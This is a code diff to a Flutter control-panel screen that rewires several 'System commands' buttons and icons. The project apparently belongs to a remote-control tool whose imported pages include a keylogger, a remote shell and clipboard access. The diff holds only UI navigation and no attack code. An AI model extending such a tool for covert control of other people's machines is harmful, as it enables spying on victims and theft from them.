@@ -9,6 +9,7 @@ import 'package:inferno_core/view/controls/clipboard.dart';
 import 'package:inferno_core/view/controls/host_file.dart';
 import 'package:inferno_core/view/controls/keylogger.dart';
 import 'package:inferno_core/view/controls/network.dart';
+import 'package:inferno_core/view/controls/pc.dart';
 import 'package:inferno_core/view/controls/shell.dart';
 import 'package:inferno_core/view/controls/sys_files.dart';
 import 'package:inferno_core/view/controls/task_manager.dart';
@@ -58,30 +59,33 @@ class ControlPanel extends StatelessWidget {
                 sectionName: "System commands",
                 items: [
                   CommandItem(
-                    text: "PC info",
-                    icon: FontAwesomeIcons.database,
+                    text: "PC",
+                    icon: Icons.desktop_windows_outlined,
                     iconSize: 27,
                     onTap: () {
-                      Get.to(() => const TaskManagerPage());
+                      Get.to(() => const PC());
                     },
                   ),
                   CommandItem(
                     text: "Account",
                     icon: FontAwesomeIcons.circleUser,
                     onTap: () {
-                      Get.to(() => const HostFilePage());
                     },
                   ),
                   CommandItem(
                     text: "Firewall",
                     icon: Icons.security,
-                    onTap: () {},
+                    onTap: () {
+                      Get.to(() => const TaskManagerPage());
+                    },
                   ),
                   CommandItem(
                     text: "Hardware",
                     icon: Icons.hardware,
                     iconSize: 29,
-                    onTap: () {},
+                    onTap: () {
+                      Get.to(() => const HostFilePage());
+                    },
                   ),
                 ],
               ),
@@ -104,7 +108,7 @@ class ControlPanel extends StatelessWidget {
                   ),
                   CommandItem(
                     text: "Screen",
-                    icon: Icons.monitor,
+                    icon: Icons.screenshot_monitor_outlined,
                     iconSize: 30,
                     onTap: () {},
                   ),
